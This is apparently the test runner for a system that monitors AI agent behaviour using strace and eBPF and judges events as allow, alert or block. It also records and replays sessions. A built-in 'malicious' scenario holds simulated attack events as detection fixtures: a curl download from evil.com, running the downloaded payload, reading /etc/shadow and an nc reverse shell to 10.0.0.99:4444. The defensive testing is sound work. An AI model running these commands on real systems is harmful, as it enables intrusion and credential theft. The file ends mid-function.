#!/usr/bin/env python3
"""
test.py — 方寸观察者模拟学习系统 统一测试入口

用法:
    python test.py                   # 交互式菜单
    python test.py --all             # 运行全部可用测试
    python test.py --unit            # 仅单元测试
    python test.py --integration     # 仅集成测试
    python test.py --scenario        # 仅场景测试（simulation 模式）
    python test.py --e2e             # 仅端到端测试（需 root）
    python test.py --web             # Web API/SSE 测试（需启动 app.py）
    python test.py --list            # 列出所有测试分类及状态
    python test.py --check           # 仅检测环境能力

输出:
    output/test_report/   — 每次运行的汇总报告
"""

import os
import sys
import time
import argparse
import subprocess
import json
import shutil
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Optional

# ── 路径常量 ────────────────────────────────────────────────────────────────
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
# 项目根目录 = scripts/ 的父目录
PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)
# 代码包目录 = project_root/observer_sim/
OBSERVER_DIR = os.path.join(PROJECT_ROOT, "observer_sim")
TESTS_DIR = os.path.join(OBSERVER_DIR, "tests")
SUDO_TEST_DIR = os.path.join(PROJECT_ROOT, "sudo_test")
OUTPUT_DIR = os.path.join(OBSERVER_DIR, "output", "test_report")
SCENARIOS_DIR = os.path.join(OBSERVER_DIR, "scenarios")
RECORDS_DIR = os.path.join(PROJECT_ROOT, "records")


# ── 环境检测 ────────────────────────────────────────────────────────────────
@dataclass
class EnvCapabilities:
    is_root: bool = False
    has_strace: bool = False
    has_ebpf: bool = False
    has_btf: bool = False
    has_libbpf: bool = False
    python3: str = ""
    app_running: bool = False

    def detect(self):
        self.python3 = sys.executable
        self.is_root = os.geteuid() == 0
        self.has_strace = shutil.which("strace") is not None
        self.has_btf = os.path.exists("/sys/kernel/btf/vmlinux")
        # 检测 libbpf
        try:
            import ctypes
            for lib in ["libbpf.so", "/usr/local/lib/libbpf.so", "libbpf.so.1"]:
                try:
                    ctypes.CDLL(lib)
                    self.has_libbpf = True
                    break
                except OSError:
                    continue
        except Exception:
            pass
        self.has_ebpf = self.has_btf and self.has_libbpf
        # 检测 app.py 是否在运行
        try:
            import urllib.request
            urllib.request.urlopen("http://localhost:8080/api/health", timeout=1)
            self.app_running = True
        except Exception:
            pass

    def summary(self) -> List[str]:
        lines = []
        lines.append(f"  Python:    {self.python3}")
        lines.append(f"  Root:      {'✅ 是' if self.is_root else '❌ 否（e2e 测试将跳过）'}")
        lines.append(f"  strace:    {'✅ 可用' if self.has_strace else '❌ 未安装'}")
        lines.append(f"  BTF:       {'✅ 支持' if self.has_btf else '❌ 不支持'}")
        lines.append(f"  libbpf:    {'✅ 可用' if self.has_libbpf else '❌ 未安装'}")
        lines.append(f"  eBPF:      {'✅ 完整可用' if self.has_ebpf else '⚠️  不可用（eBPF 测试将跳过）'}")
        lines.append(f"  Web App:   {'✅ 运行中' if self.app_running else '❌ 未运行（web 测试将跳过）'}")
        return lines


# ── 测试分类定义 ─────────────────────────────────────────────────────────────
@dataclass
class TestCategory:
    name: str
    label: str
    description: str
    files: List[str]
    requires_root: bool = False
    requires_ebpf: bool = False
    requires_strace: bool = False
    requires_web: bool = False
    run_type: str = "pytest"  # pytest | script | scenario | web_script


def get_categories() -> List[TestCategory]:
    return [
        TestCategory(
            name="unit",
            label="单元测试",
            description="核心模块的独立单元验证（无需 root/eBPF）",
            files=[
                "test_monitoring.py",
                "test_judgment.py",
                "test_blocking.py",
                "test_audit.py",
                "test_pipe_communication.py",
                "test_virtual_clock.py",
                "test_adapter.py",
            ],
        ),
        TestCategory(
            name="collector",
            label="采集器测试",
            description="各采集器（simulation/strace/ebpf/file_replay）的单元测试",
            files=[
                "test_simulation_collector.py",
                "test_ebpf_collector.py",
                "test_ebpf_field_mapping.py",
                "test_ebpf_edge_cases.py",
                "test_ebpf_performance.py",
                "test_strace_collector.py",
                "test_file_replay_collector.py",
            ],
        ),
        TestCategory(
            name="integration",
            label="集成测试",
            description="多模块协作、全链路 Pipeline 验证",
            files=[
                "test_integration.py",
                "test_collector_integration.py",
            ],
        ),
        TestCategory(
            name="scenario",
            label="场景测试",
            description="YAML 场景驱动的 simulation 模式回放验证（37 个场景）",
            files=[],
            run_type="scenario",
        ),
        TestCategory(
            name="e2e",
            label="端到端测试",
            description="高权限真实 strace/eBPF 环境验证（需 root）",
            files=[],
            requires_root=True,
            run_type="script",
        ),
        TestCategory(
            name="web",
            label="Web API 测试",
            description="Web API + SSE 推送验证（需启动 app.py）",
            files=["test_api.py", "test_sse.py"],
            requires_web=True,
            run_type="web_script",
        ),
    ]


# ── 运行器 ──────────────────────────────────────────────────────────────────
@dataclass
class TestResult:
    category: str
    passed: int = 0
    failed: int = 0
    skipped: int = 0
    error: str = ""
    duration_s: float = 0.0

    @property
    def total(self):
        return self.passed + self.failed + self.skipped


def run_pytest(files: List[str], env: EnvCapabilities, extra_args: List[str] = None) -> TestResult:
    """运行一组 pytest 测试文件"""
    cat_name = os.path.basename(files[0]) if files else "unknown"
    paths = [os.path.join(TESTS_DIR, f) for f in files if os.path.exists(os.path.join(TESTS_DIR, f))]
    # 也检查 observer_sim/ 根目录下的文件
    for f in files:
        p = os.path.join(OBSERVER_DIR, f)
        if os.path.exists(p) and p not in paths:
            paths.append(p)

    if not paths:
        return TestResult(category=cat_name, error="无可用测试文件")

    cmd = [env.python3, "-m", "pytest", "--tb=line",
           f"--override-ini=cache_dir=/tmp/pytest_cache_observer"] + paths
    if extra_args:
        cmd.extend(extra_args)

    t0 = datetime.now()
    try:
        result = subprocess.run(cmd, capture_output=True, text=True,
                                cwd=OBSERVER_DIR, timeout=300,
                                env={**os.environ, "PYTHONUNBUFFERED": "1"})
        duration = (datetime.now() - t0).total_seconds()
        output = result.stdout + result.stderr

        passed = 0
        failed = 0
        skipped = 0

        # 优先从 conftest.py 写入的 JSON 中读取（检查最新写入的文件）
        json_candidates = [
            os.path.join("/tmp", "observer_unit_test", "test_results.json"),
            os.path.join(OBSERVER_DIR, "output", "unit_test", "test_results.json"),
        ]
        # 选择最近修改的 JSON 文件
        best_path = None
        best_mtime = 0
        for jp in json_candidates:
            if os.path.exists(jp):
                mt = os.path.getmtime(jp)
                if mt > best_mtime:
                    best_mtime = mt
                    best_path = jp

        if best_path:
            try:
                with open(best_path) as jf:
                    data = json.load(jf)
                passed = data.get("passed", 0)
                failed = data.get("failed", 0)
                skipped = data.get("skipped", 0)
            except (json.JSONDecodeError, KeyError):
                pass

        # 回退: 从 pytest 输出解析
        if passed + failed + skipped == 0:
            import re
            for line in output.split("\n"):
                m = re.search(r'(\d+) passed', line)
                if m:
                    passed = int(m.group(1))
                m = re.search(r'(\d+) failed', line)
                if m:
                    failed = int(m.group(1))
                m = re.search(r'(\d+) skipped', line)
                if m:
                    skipped = int(m.group(1))

        # 如果仍为 0，从逐行输出计数
        if passed + failed + skipped == 0:
            for line in output.split("\n"):
                if "PASSED" in line:
                    passed += 1
                elif "FAILED" in line:
                    failed += 1
                elif "SKIPPED" in line:
                    skipped += 1

        return TestResult(category=cat_name, passed=passed, failed=failed,
                          skipped=skipped, duration_s=duration)
    except subprocess.TimeoutExpired:
        return TestResult(category=cat_name, error="超时(300s)")
    except Exception as e:
        return TestResult(category=cat_name, error=str(e))


def run_scenario_tests(env: EnvCapabilities, scenario_filter: str = "") -> TestResult:
    """运行 YAML 场景测试（simulation 模式）"""
    main_py = os.path.join(OBSERVER_DIR, "main.py")
    if not os.path.exists(main_py):
        return TestResult(category="scenario", error="main.py 不存在")

    # 收集场景
    categories = ["normal", "anomalous", "boundary", "multi_agent", "extreme"]
    all_scenarios = []
    for cat in categories:
        cat_dir = os.path.join(SCENARIOS_DIR, cat)
        if os.path.isdir(cat_dir):
            for f in sorted(os.listdir(cat_dir)):
                if f.endswith(".yaml"):
                    sid = f.replace(".yaml", "")
                    if not scenario_filter or scenario_filter in sid:
                        all_scenarios.append((cat, sid))

    if not all_scenarios:
        return TestResult(category="scenario", error="无场景文件")

    passed = 0
    failed = 0
    t0 = datetime.now()

    for cat, sid in all_scenarios:
        cmd = [env.python3, main_py, "--mode", "simulation", "--scenario", sid,
               "--output", os.path.join(OBSERVER_DIR, "output")]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True,
                                    cwd=OBSERVER_DIR, timeout=30,
                                    env={**os.environ, "PYTHONUNBUFFERED": "1"})
            if result.returncode == 0:
                passed += 1
                print(f"    ✅ {cat}/{sid}")
            else:
                failed += 1
                err_snippet = (result.stderr or result.stdout)[:100].strip()
                print(f"    ❌ {cat}/{sid} — {err_snippet}")
        except subprocess.TimeoutExpired:
            failed += 1
            print(f"    ⏰ {cat}/{sid} — 超时")
        except Exception as e:
            failed += 1
            print(f"    ❌ {cat}/{sid} — {e}")

    duration = (datetime.now() - t0).total_seconds()
    return TestResult(category="scenario", passed=passed, failed=failed, duration_s=duration)


def run_e2e_tests(env: EnvCapabilities) -> TestResult:
    """运行高权限端到端测试（sudo_test/run_all.sh）"""
    script = os.path.join(SUDO_TEST_DIR, "run_all.sh")
    if not os.path.exists(script):
        return TestResult(category="e2e", error="run_all.sh 不存在")

    if not env.is_root:
        return TestResult(category="e2e", error="需要 root 权限，跳过", skipped=1)

    t0 = datetime.now()
    try:
        result = subprocess.run(["bash", script], capture_output=True, text=True,
                                cwd=PROJECT_ROOT, timeout=600,
                                env={**os.environ, "PYTHONUNBUFFERED": "1"})
        duration = (datetime.now() - t0).total_seconds()
        output = result.stdout + result.stderr

        passed = output.count("[PASS]")
        failed = output.count("[FAIL]")
        skipped = output.count("[SKIP]")

        return TestResult(category="e2e", passed=passed, failed=failed,
                          skipped=skipped, duration_s=duration)
    except subprocess.TimeoutExpired:
        return TestResult(category="e2e", error="超时(600s)")
    except Exception as e:
        return TestResult(category="e2e", error=str(e))


def run_web_tests(env: EnvCapabilities) -> TestResult:
    """运行 Web API/SSE 测试"""
    if not env.app_running:
        return TestResult(category="web", error="app.py 未运行（先启动: python app.py）", skipped=1)

    files = ["test_api.py", "test_sse.py"]
    paths = [os.path.join(OBSERVER_DIR, f) for f in files if os.path.exists(os.path.join(OBSERVER_DIR, f))]
    if not paths:
        return TestResult(category="web", error="测试脚本不存在")

    import re
    t0 = datetime.now()
    passed = 0
    failed = 0
    for p in paths:
        try:
            result = subprocess.run([env.python3, p], capture_output=True, text=True,
                                    cwd=OBSERVER_DIR, timeout=60)
            output = result.stdout + result.stderr

            # 优先从脚本的汇总行解析: "=== Results: N passed, M failed ==="
            script_p, script_f = 0, 0
            for line in output.split("\n"):
                m = re.search(r'Results:\s*(\d+)\s*passed,\s*(\d+)\s*failed', line)
                if m:
                    script_p = int(m.group(1))
                    script_f = int(m.group(2))

            if script_p + script_f > 0:
                passed += script_p
                failed += script_f
            else:
                # 回退: 逐行计数（仅匹配独立测试行，排除汇总行）
                for line in output.split("\n"):
                    upper = line.strip().upper()
                    if upper.startswith("PASS:"):
                        passed += 1
                    elif upper.startswith("FAIL:"):
                        failed += 1
        except subprocess.TimeoutExpired:
            failed += 1
        except Exception:
            failed += 1

    duration = (datetime.now() - t0).total_seconds()
    return TestResult(category="web", passed=passed, failed=failed, duration_s=duration)


# ── 报告 ─────────────────────────────────────────────────────────────────────
def write_report(results: List[TestResult]):
    """写入汇总报告到 output/test_report/"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    total_p = sum(r.passed for r in results)
    total_f = sum(r.failed for r in results)
    total_s = sum(r.skipped for r in results)
    total_e = sum(1 for r in results if r.error and r.skipped == 0)

    # 文本报告
    lines = [
        f"{'=' * 70}",
        f"  方寸观察者模拟学习系统 — 测试汇总报告",
        f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"{'=' * 70}",
        "",
        f"  总计: {total_p + total_f + total_s} 项 | "
        f"✅ 通过: {total_p} | ❌ 失败: {total_f} | ⏭️  跳过: {total_s} | ⚠️  错误: {total_e}",
        "",
        f"{'─' * 70}",
    ]

    for r in results:
        if r.error and r.skipped > 0:
            status = "⏭️ "
            lines.append(f"  {status} {r.category:20s} — {r.error}")
        elif r.error:
            status = "⚠️"
            lines.append(f"  {status} {r.category:20s} — {r.error}")
        else:
            status = "✅" if r.failed == 0 else "❌"
            dur = f"{r.duration_s:.1f}s" if r.duration_s else "-"
            lines.append(
                f"  {status} {r.category:20s} | 通过: {r.passed:3d} | "
                f"失败: {r.failed:3d} | 跳过: {r.skipped:3d} | {dur}")

    lines.append(f"{'─' * 70}")
    if total_f == 0 and total_e == 0:
        lines.append("  🎉 全部通过！")
    elif total_f > 0:
        lines.append(f"  ⚠️  有 {total_f} 项失败，请检查上方详情。")
    lines.append("")

    report_text = "\n".join(lines)
    print(report_text)
    txt_path = os.path.join(OUTPUT_DIR, f"report_{ts}.txt")
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write(report_text)

    # JSON 报告
    json_data = {
        "timestamp": datetime.now().isoformat(),
        "summary": {"passed": total_p, "failed": total_f, "skipped": total_s, "errors": total_e},
        "categories": [
            {"name": r.category, "passed": r.passed, "failed": r.failed,
             "skipped": r.skipped, "error": r.error, "duration_s": r.duration_s}
            for r in results
        ],
    }
    json_path = os.path.join(OUTPUT_DIR, f"report_{ts}.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(json_data, f, ensure_ascii=False, indent=2)

    # 始终保留 latest 链接
    latest_txt = os.path.join(OUTPUT_DIR, "latest.txt")
    latest_json = os.path.join(OUTPUT_DIR, "latest.json")
    shutil.copy2(txt_path, latest_txt)
    shutil.copy2(json_path, latest_json)

    return total_f == 0 and total_e == 0


# ── 录制-回放状态 ─────────────────────────────────────────────────────────────
_active_recorder = None  # 当前活跃的 SessionRecorder


def _start_recording(env: EnvCapabilities):
    """开始录制会话"""
    global _active_recorder
    if _active_recorder and _active_recorder.is_recording:
        print(f"  !! 已在录制中 (session: {_active_recorder.session_id})")
        return

    sys.path.insert(0, OBSERVER_DIR)
    from recorder.session_recorder import SessionRecorder

    # 选择 agent_id
    agent_id = input("  Agent ID [record-agent]: ").strip() or "record-agent"

    recorder = SessionRecorder(
        records_dir=RECORDS_DIR,
        agent_id=agent_id,
        collect_mode="simulation",
    )
    recorder.start()

    # 在 simulation 模式下，录制内置场景事件
    print(f"\n  Recording started: {recorder.session_id}")
    print(f"  Session dir: {recorder.session_dir}")
    print(f"  Select scenario to record (or 'done' to stop):")
    print(f"    Built-in:  malicious / normal")
    print(f"    DeepAgent: da01 (data analysis)")
    print(f"               da02 (code generation)")
    print(f"               da03 (suspicious behavior)")
    print(f"               da04 (Q3 production demo)")
    print(f"    YAML scenario ID: n01, a01, b03, etc.")

    from models.event import RawEvent
    import yaml

    total_events = 0
    while True:
        choice = input("  Scenario [done]: ").strip()
        if not choice or choice.lower() == "done":
            break

        events = _generate_scenario_events(choice, OBSERVER_DIR, agent_id)
        if not events:
            print(f"  !! Unknown scenario: {choice}")
            continue

        for evt in events:
            recorder.write_event(evt)
            total_events += 1
            desc = _short_event_desc(evt)
            print(f"    [REC {total_events:03d}] {evt.event_type:10s} | {desc}")

    summary = recorder.stop()
    _active_recorder = None

    print(f"\n  Recording stopped:")
    print(f"    Session:   {summary.get('session_id', '')}")
    print(f"    Events:    {summary.get('event_count', 0)}")
    print(f"    Duration:  {summary.get('duration_s', 0):.1f}s")
    print(f"    File:      {summary.get('events_file', '')}")
    print(f"    Meta:      {summary.get('meta_file', '')}")


def _stop_recording():
    """结束录制"""
    global _active_recorder
    if not _active_recorder or not _active_recorder.is_recording:
        print("  !! 当前没有活跃的录制会话")
        return
    summary = _active_recorder.stop()
    _active_recorder = None
    print(f"  Recording stopped: {summary.get('event_count', 0)} events")


def _replay_recording():
    """回放历史录制"""
    sys.path.insert(0, OBSERVER_DIR)
    from recorder.session_recorder import SessionRecorder
    from recorder.replay_engine import ReplayEngine

    recordings = SessionRecorder.list_recordings(RECORDS_DIR)
    if not recordings:
        print("  !! 没有历史录制 (records/ 目录为空)")
        return

    # 显示列表
    print(f"\n  {'No':>3s}  {'Session ID':16s}  {'Events':>6s}  {'Mode':12s}  {'Duration':>8s}  Agent")
    print(f"  {'---':>3s}  {'----------------':16s}  {'------':>6s}  {'------------':12s}  {'--------':>8s}  -----")
    for i, rec in enumerate(recordings, 1):
        dur = f"{float(rec.get('duration_seconds', 0)):.1f}s"
        print(f"  {i:3d}  {str(rec['session_id']):16s}  {int(rec.get('event_count', 0)):6d}  "
              f"{str(rec.get('collect_mode', '')):12s}  {dur:>8s}  {str(rec.get('agent_id', ''))}")

    # 选择
    choice = input(f"\n  Select recording [1-{len(recordings)}]: ").strip()
    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(recordings):
            raise ValueError
    except ValueError:
        print("  !! Invalid selection")
        return

    selected = recordings[idx]
    print(f"\n  Replaying: {selected['session_id']}")

    # 加载 config
    config_path = os.path.join(OBSERVER_DIR, "config.yaml")
    config = {}
    if os.path.isfile(config_path):
        import yaml
        with open(config_path, "r", encoding="utf-8") as f:
            config = yaml.safe_load(f) or {}

    engine = ReplayEngine(config)
    engine.replay(selected["session_dir"])


def _full_pipeline_verify():
    """全链路稳定性验证: 同一录制 N 次回放，比较统计一致性"""
    sys.path.insert(0, OBSERVER_DIR)
    from recorder.session_recorder import SessionRecorder
    from recorder.replay_engine import ReplayEngine

    recordings = SessionRecorder.list_recordings(RECORDS_DIR)
    if not recordings:
        print("  !! 没有历史录制 (records/ 目录为空)")
        print("  提示: 先用 [9] 开始录制 → [A] 结束录制，或 python test.py --record")
        return

    # 显示录制列表
    print(f"\n  {'No':>3s}  {'Session ID':16s}  {'Events':>6s}  {'Mode':12s}  {'Duration':>8s}  Agent")
    print(f"  {'---':>3s}  {'----------------':16s}  {'------':>6s}  {'------------':12s}  {'--------':>8s}  -----")
    for i, rec in enumerate(recordings, 1):
        dur = f"{float(rec.get('duration_seconds', 0)):.1f}s"
        print(f"  {i:3d}  {str(rec['session_id']):16s}  {int(rec.get('event_count', 0)):6d}  "
              f"{str(rec.get('collect_mode', '')):12s}  {dur:>8s}  {str(rec.get('agent_id', ''))}")

    # 选择录制
    choice = input(f"\n  选择录制 [1-{len(recordings)}]: ").strip()
    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(recordings):
            raise ValueError
    except ValueError:
        print("  !! 无效选择")
        return

    selected = recordings[idx]

    # 输入回放次数
    n_str = input(f"  回放次数 [默认=3]: ").strip()
    try:
        N = int(n_str) if n_str else 3
        if N < 2:
            print("  !! 至少需要 2 次回放才能比较一致性")
            return
        if N > 10:
            print("  !! 最多支持 10 次回放")
            return
    except ValueError:
        print("  !! 无效数字")
        return

    print(f"\n{'=' * 60}")
    print(f"  全链路稳定性验证 — {selected['session_id']} × {N}")
    print(f"{'=' * 60}")

    # 加载 config
    config_path = os.path.join(OBSERVER_DIR, "config.yaml")
    config = {}
    if os.path.isfile(config_path):
        import yaml
        with open(config_path, "r", encoding="utf-8") as f:
            config = yaml.safe_load(f) or {}

    # 执行 N 次回放，收集统计
    summaries = []
    audit_stats = []
    for run_idx in range(1, N + 1):
        print(f"\n  ── 第 {run_idx}/{N} 次回放 ──")
        engine = ReplayEngine(config)
        summary = engine.replay(selected["session_dir"])
        summaries.append(summary)

        # 从审计日志提取详细统计
        audit_dir = os.path.join(selected["session_dir"],
                                 "replay_output", "audit")
        audit_stat = _extract_audit_stats(audit_dir)
        audit_stats.append(audit_stat)

        print(f"    结果: ALLOW={summary['allow']} ALERT={summary['alert']} "
              f"BLOCK={summary['block']} TOTAL={summary['total']}")

    # ── 一致性分析 ──
    print(f"\n{'=' * 60}")
    print(f"  一致性分析")
    print(f"{'=' * 60}")

    all_consistent = True

    # 检查 allow/alert/block 计数
    for key, label in [("allow", "ALLOW"), ("alert", "ALERT"), ("block", "BLOCK"),
                       ("total", "TOTAL"), ("events_loaded", "加载事件")]:
        values = [s.get(key, 0) for s in summaries]
        unique = set(values)
        if len(unique) == 1:
            print(f"  ✅ {label}: 全部一致 ({values[0]})")
        else:
            all_consistent = False
            print(f"  ❌ {label}: 不一致! 值: {values}")

    # 检查 max_score 偏差
    max_scores = [s.get("max_score", 0) for s in audit_stats]
    if max_scores:
        score_range = max(max_scores) - min(max_scores)
        if score_range <= 0.001:
            print(f"  ✅ max_score: 全部一致 ({max_scores[0]:.4f})")
        else:
            all_consistent = False
            print(f"  ⚠️  max_score 有偏差 (范围: {score_range:.4f}): {[f'{v:.4f}' for v in max_scores]}")

    # 检查 rule_hits 一致性
    rule_hits_list = [s.get("rule_hits", {}) for s in audit_stats]
    if rule_hits_list:
        all_rules = set()
        for rh in rule_hits_list:
            all_rules.update(rh.keys())
        rule_consistent = True
        for rule_id in sorted(all_rules):
            hits = [rh.get(rule_id, 0) for rh in rule_hits_list]
            unique_hits = set(hits)
            if len(unique_hits) > 1:
                rule_consistent = False
                all_consistent = False
                print(f"  ❌ Rule {rule_id}: 命中次数不一致! {hits}")
        if rule_consistent:
            print(f"  ✅ Rule Hits: 全部一致 ({len(all_rules)} 条规则)")

    # ── 总结 ──
    print(f"\n{'─' * 60}")
    if all_consistent:
        print(f"  🎉 全链路稳定性验证通过! "
              f"{N} 次回放统计完全一致。")
    else:
        print(f"  ⚠️  检测到不一致项，请检查上方详情。")
        print(f"  可能原因: 随机化逻辑、时间戳依赖、或并发竞态。")
    print(f"{'─' * 60}")


def _extract_audit_stats(audit_dir: str) -> dict:
    """从审计目录提取 max_score 和 rule_hits 统计"""
    import glob as _glob
    result = {"max_score": 0.0, "rule_hits": {}}
    jsonl_files = _glob.glob(os.path.join(audit_dir, "*.jsonl"))
    if not jsonl_files:
        return result
    # 取最新的 JSONL
    jsonl_files.sort(key=os.path.getmtime, reverse=True)
    try:
        with open(jsonl_files[0], "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    entry = json.loads(line)
                except json.JSONDecodeError:
                    continue
                score = entry.get("risk_score", 0)
                if score > result["max_score"]:
                    result["max_score"] = score
                for rule_id in entry.get("matched_rules", []):
                    result["rule_hits"][rule_id] = \
                        result["rule_hits"].get(rule_id, 0) + 1
    except Exception:
        pass
    return result


def _generate_scenario_events(scenario_id: str, observer_dir: str,
                               agent_id: str) -> list:
    """根据场景 ID 生成事件列表"""
    from models.event import RawEvent

    # 内置模拟场景
    if scenario_id == "malicious":
        return _builtin_malicious_events(agent_id)
    elif scenario_id == "normal":
        return _builtin_normal_events(agent_id)

    # 内置 DeepAgent 场景 (pydantic-deep 预设)
    elif scenario_id == "da01":
        return _builtin_da01_events(agent_id)
    elif scenario_id == "da02":
        return _builtin_da02_events(agent_id)
    elif scenario_id == "da03":
        return _builtin_da03_events(agent_id)
    elif scenario_id == "da04":
        return _builtin_da04_events(agent_id)

    # 尝试加载 YAML 场景
    import yaml
    import glob
    yaml_files = glob.glob(
        os.path.join(observer_dir, "scenarios", "**", f"{scenario_id}*.yaml"),
        recursive=True)
    if not yaml_files:
        return []

    events = []
    with open(yaml_files[0], "r", encoding="utf-8") as f:
        sc = yaml.safe_load(f)

    base_ts = 1718092800000000000

    # 检查是否为 deep_agent 格式 (含 tool_calls)
    tool_calls = sc.get("tool_calls", [])
    if tool_calls:
        scenario_meta = sc.get("scenario", {})
        base_ts = scenario_meta.get("base_timestamp_ns", base_ts)
        return _tool_calls_to_events(tool_calls, base_ts, agent_id, scenario_id)

    # 标准场景格式 (含 commands)
    for i, cmd_def in enumerate(sc.get("commands", [])):
        cmd = cmd_def.get("command", "")
        parts = cmd.split()
        exe = parts[0] if parts else cmd
        args = parts[1:] if len(parts) > 1 else []
        events.append(RawEvent(
            event_id=f"sc_{scenario_id}_{i+1:03d}",
            timestamp_ns=base_ts + i * 100_000_000,
            event_type="exec",
            pid=10000 + i, ppid=10000,
            agent_id=agent_id,
            agent_framework="recorded",
            executable=exe, arguments=args,
        ))

    return events


def _tool_calls_to_events(tool_calls: list, base_ts: int,
                           agent_id: str, scenario_id: str) -> list:
    """将 DeepAgent YAML 的 tool_calls 转换为 RawEvent 列表"""
    from models.event import RawEvent

    # 工具名 → 事件类型映射
    _EXEC_TOOLS = {"execute", "execute_command", "run_command", "shell", "bash"}
    _READ_TOOLS = {"read_file", "read", "cat", "list_files", "grep", "glob"}
    _WRITE_TOOLS = {"write_file", "write", "edit_file", "edit", "patch"}
    _NET_TOOLS = {"web_fetch", "fetch", "web_search", "browse", "curl"}

    events = []
    seq = 0
    pid_base = 60000

    for call in tool_calls:
        seq += 1
        tool_name = call.get("tool", "execute")
        tool_input = call.get("input", {})
        delay_ms = call.get("delay_ms", 100)
        ts = base_ts + seq * delay_ms * 1_000_000  # ms → ns

        executable = None
        arguments = None
        file_path = None
        file_op = None
        remote_addr = None
        remote_port = None
        protocol = None
        event_type = "exec"  # default

        if tool_name in _EXEC_TOOLS:
            event_type = "exec"
            cmd = tool_input.get("command", tool_input.get("cmd", tool_name))
            parts = cmd.split() if isinstance(cmd, str) else [str(cmd)]
            executable = parts[0] if parts else tool_name
            arguments = parts

        elif tool_name in _READ_TOOLS:
            event_type = "file_open"
            file_path = (tool_input.get("path")
                         or tool_input.get("file_path")
                         or tool_input.get("file") or "")
            file_op = "read"

        elif tool_name in _WRITE_TOOLS:
            event_type = "file_open"
            file_path = (tool_input.get("path")
                         or tool_input.get("file_path")
                         or tool_input.get("file") or "")
            file_op = "write"

        elif tool_name in _NET_TOOLS:
            event_type = "net_conn"
            url = (tool_input.get("url") or tool_input.get("query") or "")
            remote_addr = _extract_host(url)
            remote_port = 443
            protocol = "TCP"

        else:
            # 未知工具 → exec
            event_type = "exec"
            cmd = tool_input.get("command", tool_name)
            parts = cmd.split() if isinstance(cmd, str) else [str(cmd)]
            executable = parts[0] if parts else tool_name
            arguments = parts

        events.append(RawEvent(
            event_id=f"da_{scenario_id}_{seq:03d}",
            timestamp_ns=ts,
            event_type=event_type,
            pid=pid_base + seq, ppid=pid_base,
            agent_id=agent_id,
            agent_framework="pydantic-deep-sim",
            executable=executable,
            arguments=arguments,
            file_path=file_path,
            file_op=file_op,
            remote_addr=remote_addr,
            remote_port=remote_port,
            protocol=protocol,
        ))

    return events


def _extract_host(url: str) -> str:
    """从 URL 提取主机地址"""
    if not url:
        return "unknown"
    host = url
    for prefix in ("https://", "http://", "ftp://"):
        if host.startswith(prefix):
            host = host[len(prefix):]
            break
    host = host.split("/")[0].split("?")[0].split(":")[0]
    return host or "unknown"


def _builtin_malicious_events(agent_id: str) -> list:
    """内置恶意场景事件"""
    from models.event import RawEvent
    base = 1718092800000000000
    return [
        RawEvent(event_id="m01", timestamp_ns=base, event_type="exec",
                 pid=50001, ppid=50000, agent_id=agent_id,
                 agent_framework="recorded",
                 executable="/usr/bin/curl",
                 arguments=["curl", "-s", "https://evil.com/payload.sh"]),
        RawEvent(event_id="m02", timestamp_ns=base+100_000_000,
                 event_type="net_conn", pid=50001, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 remote_addr="192.168.1.100", remote_port=443, protocol="TCP"),
        RawEvent(event_id="m03", timestamp_ns=base+200_000_000,
                 event_type="file_open", pid=50001, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 file_path="/tmp/payload.sh", file_op="write"),
        RawEvent(event_id="m04", timestamp_ns=base+300_000_000,
                 event_type="exec", pid=50002, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 executable="/bin/bash",
                 arguments=["bash", "/tmp/payload.sh"]),
        RawEvent(event_id="m05", timestamp_ns=base+400_000_000,
                 event_type="file_open", pid=50002, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 file_path="/etc/shadow", file_op="read"),
        RawEvent(event_id="m06", timestamp_ns=base+500_000_000,
                 event_type="net_conn", pid=50002, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 remote_addr="10.0.0.99", remote_port=4444, protocol="TCP"),
        RawEvent(event_id="m07", timestamp_ns=base+600_000_000,
                 event_type="exec", pid=50003, ppid=50000,
                 agent_id=agent_id, agent_framework="recorded",
                 executable="/usr/bin/nc",
                 arguments=["nc", "-e", "/bin/sh", "10.0.0.99", "4444"]),
    ]


def _builtin_da01_events(agent_id: str) -> list:
    """DeepAgent 场景 da01: 数据分析助手 (8 events, 全部 ALLOW)"""
    return _load_deep_agent_scenario("da01_data_analysis", agent_id)


def _builtin_da02_events(agent_id: str) -> list:
    """DeepAgent 场景 da02: 代码生成与测试 (11 events, 全部 ALLOW)"""
    return _load_deep_agent_scenario("da02_code_generation", agent_id)


def _builtin_da03_events(agent_id: str) -> list:
    """DeepAgent 场景 da03: 可疑 Agent 行为 (10 events, 触发 ALERT/BLOCK)"""
    return _load_deep_agent_scenario("da03_suspicious_behavior", agent_id)


def _builtin_da04_events(agent_id: str) -> list:
    """DeepAgent 场景 da04: Q3 商业报表分析 (17 events, 生产演示 ALLOW/ALERT/BLOCK)"""
    return _load_deep_agent_scenario("da04_production_demo", agent_id)


def _load_deep_agent_scenario(scenario_name: str, agent_id: str) -> list:
    """加载 DeepAgent YAML 场景并转换为事件列表"""
    import yaml
    scenario_path = os.path.join(
        OBSERVER_DIR, "scenarios", "deep_agent", f"{scenario_name}.yaml")
    if not os.path.isfile(scenario_path):
        print(f"  !! DeepAgent 场景文件不存在: {scenario_path}")
        return []

    with open(scenario_path, "r", encoding="utf-8") as f:
        data = yaml.safe_load(f)

    tool_calls = data.get("tool_calls", [])
    if not tool_calls:
        return []

    scenario_meta = data.get("scenario", {})
    base_ts = scenario_meta.get("base_timestamp_ns", 1718092800000000000)
    scenario_id = scenario_meta.get("id", scenario_name[:4])
    return _tool_calls_to_events(tool_calls, base_ts, agent_id, scenario_id)


def _builtin_normal_events(agent_id: str) -> list:
    """内置正常场景事件"""
